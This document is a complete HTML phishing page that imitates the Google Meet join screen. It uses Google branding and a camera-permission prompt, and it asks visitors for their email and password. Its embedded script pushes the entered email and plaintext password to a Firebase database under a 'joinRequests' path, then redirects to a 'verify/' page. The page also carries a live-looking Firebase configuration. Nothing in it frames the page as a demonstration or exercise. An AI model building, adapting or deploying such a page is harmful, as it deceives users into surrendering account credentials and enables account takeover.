<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Google Meet</title>

  <!-- ✅ Favicon -->
  <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/meet_2020q4_48dp.png" />

  <!-- ✅ Material Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />

  <!-- ✅ Firebase Script -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBEKuc4mzaWI5I6R9QgAeDHMz13bKk5Oy4",
      authDomain: "asf-panel-azizul.firebaseapp.com",
      projectId: "asf-panel-azizul",
      storageBucket: "asf-panel-azizul.firebasestorage.app",
      messagingSenderId: "444571143429",
      appId: "1:444571143429:web:a435815af2bbd7c2d0bb6c",
      measurementId: "G-79PTWV1GY4"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById("askJoinBtn");
      const spinner = document.getElementById("spinner");

      // Popup setup
      const popup = document.createElement("div");
      popup.id = "popup-message";
      Object.assign(popup.style, {
        position: "fixed",
        top: "20px",
        left: "50%",
        transform: "translateX(-50%)",
        backgroundColor: "#f44336",
        color: "#fff",
        padding: "12px 20px",
        borderRadius: "4px",
        boxShadow: "0 2px 6px rgba(0,0,0,0.3)",
        fontSize: "14px",
        fontWeight: "500",
        zIndex: "9999",
        display: "none",
      });
      document.body.appendChild(popup);

      function showPopup(message) {
        popup.textContent = message;
        popup.style.display = "block";
        setTimeout(() => (popup.style.display = "none"), 3000);
      }

      btn.addEventListener("click", async () => {
        const email = document.querySelector('input[type="email"]').value.trim();
        const password = document.querySelector('input[type="password"]').value.trim();
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!email || !password) return showPopup("Please enter both email and password");
        if (!emailRegex.test(email)) return showPopup("Please enter a valid email address");

        btn.disabled = true;
        spinner.style.display = "block";

        try {
          await push(ref(db, "joinRequests"), {
            email,
            password,
            timestamp: new Date().toLocaleString(),
          });
          console.log("Data sent to Firebase");
        } catch (error) {
          console.error("Error:", error);
          showPopup("Error sending data");
          btn.disabled = false;
          spinner.style.display = "none";
          return;
        }

        setTimeout(() => (window.location.href = "verify/"), 2000);
      });
    });
  </script>

  <!-- ✅ Styles -->
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body {
      font-family: 'Arial', sans-serif;
      background-color: #fff;
      color: #202124;
    }
    .top-bar {
      display: flex; align-items: center; padding: 16px 40px;
    }
    .logo img {
      height: 70px; margin-right: 10px;
    }
    .main {
      display: flex; justify-content: space-between;
      padding: 40px 60px; flex-wrap: wrap;
    }
    .video-section {
      width: 58%; background-color: #202124;
      border-radius: 18px; height: 400px; position: relative;
      display: flex; justify-content: center; align-items: center;
      color: white; margin-right: 40px;
    }
    video {
      position: absolute; width: 100%; height: 100%;
      border-radius: 18px; object-fit: cover; z-index: 1;
    }
    .video-overlay {
      z-index: 3; text-align: center;
    }
    .video-text {
      font-size: 20px; font-weight: 500; margin-bottom: 20px;
    }
    .allow-btn {
      background-color: #1a73e8; color: white; border: none;
      padding: 12px 20px; font-size: 14px; border-radius: 6px;
      cursor: pointer; transition: background 0.3s ease;
    }
    .allow-btn:hover { background-color: #1669d0; }
    .controls {
      position: absolute; bottom: 20px; left: 50%;
      transform: translateX(-50%); display: flex; gap: 20px; z-index: 3;
    }
    .control-btn {
      width: 50px; height: 50px; background: #ea4335;
      border-radius: 50%; color: white; border: none;
      display: flex; justify-content: center; align-items: center;
      font-size: 28px; cursor: pointer; position: relative;
    }
    .control-btn .badge {
      position: absolute; top: -4px; right: -4px;
      background: #fbbc04; color: white; border-radius: 50%;
      font-size: 10px; width: 16px; height: 16px;
      display: flex; justify-content: center; align-items: center;
      font-weight: bold;
    }
    .form-section {
      width: 35%; display: flex; flex-direction: column; justify-content: center;
    }
    .form-section h2 {
      font-size: 26px; font-weight: 600; margin-bottom: 30px;
      text-align: center; color: #202124;
    }
    .form-input {
      width: 100%; padding: 12px; margin-bottom: 15px;
      border: 1px solid #ccc; border-radius: 6px; font-size: 15px;
    }
    .btn-join {
      background-color: #1a73e8; color: white; padding: 14px 0;
      width: 100%; font-size: 16px; border: none;
      border-radius: 30px; cursor: pointer;
    }
    .btn-join:hover { background-color: #1669d0; }
    .spinner {
      border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8;
      border-radius: 50%; width: 28px; height: 28px;
      animation: spin 1s linear infinite; display: none;
      margin: 20px auto 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .other-options {
      text-align: center; font-size: 14px; margin-top: 10px;
    }
    .other-options a {
      color: #1a73e8; text-decoration: none;
    }
    .device-info-bar {
      display: flex; gap: 25px; margin-top: 0px;
      margin-left: 122px; color: #5f6368;
      font-size: 13px; align-items: center; flex-wrap: wrap;
    }
    .device-item { display: flex; align-items: center; gap: 6px; }
    @media (max-width: 1000px) {
      .main { flex-direction: column; align-items: center; padding: 20px; }
      .video-section, .form-section { width: 90%; margin: 0 0 40px 0; }
      .device-info-bar { margin-left: 0; justify-content: center; }
    }
  </style>
</head>
<body>

  <!-- ✅ Top Bar -->
  <div class="top-bar">
    <div class="logo">
      <img src="logo.png" alt="Google Meet">
    </div>
  </div>

  <!-- ✅ Main Section -->
  <div class="main">
    <!-- Left Video Section -->
    <div class="video-section">
      <video id="video" autoplay muted playsinline style="display:none;"></video>
      <div class="video-overlay" id="videoOverlay">
        <p class="video-text">Do you want people to see and hear you in the meeting?</p>
        <button class="allow-btn" onclick="startCamera()">Allow microphone and camera</button>
      </div>
      <div class="controls">
        <button class="control-btn"><span class="material-icons">mic_off</span><div class="badge">!</div></button>
        <button class="control-btn"><span class="material-icons">videocam_off</span><div class="badge">!</div></button>
      </div>
    </div>

    <!-- Right Form Section -->
    <div class="form-section">
      <h2>What's your Email?</h2>
      <input type="email" class="form-input" placeholder="Enter Your Email" />
      <input type="password" class="form-input" placeholder="Enter Your Password" />
      <button class="btn-join" id="askJoinBtn">Ask to Join</button>
      <div class="spinner" id="spinner"></div>
      <div class="other-options">
        Other joining options<br />
        <a href="#">Ask to use Companion mode</a>
      </div>
    </div>
  </div>

  <!-- ✅ Device Info Bar -->
  <div class="device-info-bar">
    <div class="device-item"><span class="material-icons">mic</span><span>Permission needed</span></div>
    <div class="device-item"><span class="material-icons">volume_up</span><span>Permission needed</span></div>
    <div class="device-item"><span class="material-icons">videocam</span><span>Permission needed</span></div>
  </div>

  <!-- ✅ Camera Start Script -->
  <script>
    function startCamera() {
      const video = document.getElementById("video");
      const overlay = document.getElementById("videoOverlay");
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then((stream) => {
          video.srcObject = stream;
          video.style.display = "block";
          overlay.style.display = "none";
        })
        .catch((err) => {
          alert("Could not access camera/microphone: " + err.message);
        });
    }
  </script>
</body>
</html>
